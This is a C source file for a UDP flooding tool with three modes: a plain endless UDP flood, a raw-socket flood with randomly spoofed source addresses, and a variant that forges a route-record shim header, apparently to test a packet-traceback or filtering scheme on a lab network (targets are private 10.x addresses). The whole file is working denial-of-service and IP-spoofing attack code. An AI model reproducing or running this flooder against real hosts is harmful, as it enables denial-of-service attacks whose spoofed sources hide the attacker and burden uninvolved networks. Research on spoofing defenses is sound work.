#include<stdio.h> 
#include<string.h> 
#include<stdlib.h> 
#include<arpa/inet.h>
#include<sys/socket.h>
#include <unistd.h>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>
#include "netfilter.h"

#include <netinet/ip.h>
#include <netinet/udp.h>

#define BUFLEN 512  //Max length of buffer
#define PORT 8080   //The port on which to send data

struct psd_udp {
  struct in_addr src;
  struct in_addr dst;
  unsigned char pad;
  unsigned char proto;
  unsigned short udp_len;
  struct udphdr udp;
};

unsigned short in_cksum(unsigned short *addr, int len)
{
  int nleft = len;
  int sum = 0;
  unsigned short *w = addr;
  unsigned short answer = 0;

  while (nleft > 1) {
    sum += *w++;
    nleft -= 2;
  }

  if (nleft == 1) {
    *(unsigned char *) (&answer) = *(unsigned char *) w;
    sum += answer;
  }
  
  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

unsigned short in_cksum_udp(int src, int dst, unsigned short *addr, int len)
{
  struct psd_udp buf;

  memset(&buf, 0, sizeof(buf));
  buf.src.s_addr = src;
  buf.dst.s_addr = dst;
  buf.pad = 0;
  buf.proto = IPPROTO_UDP;
  buf.udp_len = htons(len);
  memcpy(&(buf.udp), addr, len);
  return in_cksum((unsigned short *)&buf, 12 + len);
}
  

void normal_attack(char* victim_ip){
  struct sockaddr_in dest;
  int dest_len = sizeof(struct sockaddr_in);
  int sock_fd;
  char *message = "You are under attack!";

  if ( (sock_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1){
    perror("Fail to create a UDP socket.");
    exit(1);
  }
  
  memset((char *) &dest, 0, sizeof(dest));
  dest.sin_family = AF_INET;
  dest.sin_port = htons(PORT);
     
  if (inet_aton(victim_ip , &dest.sin_addr) == 0) {
    perror("inet_aton() failed\n");
    exit(1);
  }
 
  while(1){    
    //send the packet
    if (sendto(sock_fd, message, strlen(message), 0, (struct sockaddr *)&dest, dest_len)==-1){
      exit(1);
    }      
  }
  close(sock_fd);
}

void ip_spoof_attack(char* victim_ip){
  int sock_fd;
  srand(time(NULL));

  sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  if(sock_fd < 0){
    perror("Fail to create raw socket!\n");
  }

  struct iphdr ip;
  struct udphdr udp;
  int sd;
  const int on = 1;
  struct sockaddr_in sin;
  u_char *packet;
  
  uint32_t ul_dst;
  uint32_t random_num;

  packet = (u_char *)malloc(60);
  
  while (1) {
    ip.ihl = 0x5;
    ip.version = 0x4;
    ip.tos = 0x0;
    ip.tot_len = 60;
    ip.id = 0;
    ip.frag_off = 0x0;
    ip.ttl = 64;
    ip.protocol = IPPROTO_UDP;
    ip.check = 0x0;
    
    random_num = rand();
    ul_dst = (random_num >> 24 & 0xFF) << 24 | 
            (random_num >> 16 & 0xFF) << 16 | 
            (random_num >> 8 & 0xFF) << 8 | 
            (random_num & 0xFF);
    ip.saddr = ul_dst;
    //printf("%u\n",ul_dst);
    
    ip.daddr = inet_addr(victim_ip);
    ip.check = in_cksum((unsigned short *)&ip, sizeof(ip));
    memcpy(packet, &ip, sizeof(ip));

    udp.uh_sport = htons(45512);
    udp.uh_dport = htons(53512);
    udp.uh_ulen = htons(8);
    udp.uh_sum = 0;
    udp.uh_sum = in_cksum_udp(ip.saddr, ip.daddr, (unsigned short *)&udp, sizeof(udp));
    memcpy(packet + 20, &udp, sizeof(udp));

    //char *msg = "You are under attack!";
    //memcpy(((void *) udp) + sizeof(struct udphdr), msg, strlen(msg));
    
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = ip.daddr;
    
    sendto(sock_fd, packet, 60, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr));
    sleep(1);
  }
}
 
void rr_spoof_attack(char* victim_ip){
  int sock_fd;
  srand(time(NULL));

  sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  if(sock_fd < 0){
    perror("Fail to create raw socket!\n");
  }

  struct iphdr ip;
  struct udphdr udp;
  int sd;
  const int on = 1;
  struct sockaddr_in sin;
  u_char *packet;
  
  uint32_t ul_dst;
  uint32_t random_num;
  int rr_spoof_hash = 0;

  packet = (u_char *)malloc(60);
  
  while (1) {
    ip.ihl = 0x5;
    ip.version = 0x4;
    ip.tos = 0x0;
    ip.tot_len = 60;
    ip.id = 0;
    ip.frag_off = 0x0;
    ip.ttl = 64;
    ip.protocol = IPPROTO_UDP;
    ip.check = 0x0;
    
    random_num = rand();
    ul_dst = (random_num >> 24 & 0xFF) << 24 | 
            (random_num >> 16 & 0xFF) << 16 | 
            (random_num >> 8 & 0xFF) << 8 | 
            (random_num & 0xFF);
    ip.saddr = ul_dst;
    //printf("%u\n",ul_dst);
    
    ip.daddr = inet_addr(victim_ip);
//    ip.check = in_cksum((unsigned short *)&ip, sizeof(ip));
//    memcpy(packet, &ip, sizeof(ip));

    udp.uh_sport = htons(45512);
    udp.uh_dport = htons(53512);
    udp.uh_ulen = htons(8);
    udp.uh_sum = 0;
//    udp.uh_sum = in_cksum_udp(ip.saddr, ip.daddr, (unsigned short *)&udp, sizeof(udp));
//    memcpy(packet + 20, &udp, sizeof(udp));

    //char *msg = "You are under attack!";
    //memcpy(((void *) udp) + sizeof(struct udphdr), msg, strlen(msg));
    
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = ip.daddr;
    
    int pkt_size = 60;
    struct iphdr *newpacket = (struct iphdr *)add_shim(packet, &pkt_size);
    Shim *shim = (void *)newpacket + sizeof(struct iphdr);
    struct in_addr rr_spoof_addr;
    rr_spoof_addr.s_addr = 0x0a0a807a;
    assign_addr(&shim->route_record[0].addr, &rr_spoof_addr);
    
    (shim->route_record[0].hash_value) = rr_spoof_hash;
    rr_spoof_hash++;
    
    printf("Expected size: 116, Actual size: %d\n", pkt_size);
    
    ip.check = in_cksum((unsigned short *)&ip, sizeof(ip));
    memcpy(packet, &ip, sizeof(ip));
    memcpy(packet + 20, shim, sizeof(Shim));
    udp.uh_sum = in_cksum_udp(ip.saddr, ip.daddr, (unsigned short *)&udp, sizeof(udp));
    memcpy(packet + 20 + pkt_size, &udp, sizeof(udp)); 
                                                       
    sendto(sock_fd, newpacket, 116, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr));
    sleep(1);
  }
}
 
void print_invalid_arg(){
  printf("Invalid Arg\n");
  printf("Arg 1:\n");
  printf("  0 - Normal Attack\n");
  printf("  1 - IP Spoofing Attack\n");
  printf("  2 - RR Spoofing Attack\n");
}
 
int main(int argc, char *argv[])
{
  
  if (argc != 2) {
    print_invalid_arg();
    return -1;
  }
  
  if (*argv[1] == '0') {
    //normal_attack("192.14.121.23");
    normal_attack("10.10.128.150");
  }
  else if (*argv[1] == '1') {
    //ip_spoof_attack("192.14.121.23");
    ip_spoof_attack("10.10.128.150");
  }
  else if (*argv[1] == '2') {
    //rr_spoof_attack("192.14.121.23");
    rr_spoof_attack("10.10.128.150");
  }
  else {
    print_invalid_arg();
    return -1;
  }
    
  return 0;
}
